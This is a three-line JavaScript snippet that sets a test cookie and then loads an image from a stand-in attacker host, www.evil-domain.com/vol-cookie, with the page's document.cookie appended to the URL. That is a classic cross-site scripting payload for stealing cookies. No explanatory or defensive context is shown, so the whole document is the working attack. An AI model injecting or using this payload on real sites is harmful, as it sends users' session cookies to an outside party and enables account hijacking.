document.cookie = "test=salut; Domain=";
new Image().src =
  "http://www.evil-domain.com/vol-cookie?cookie=" + document.cookie;
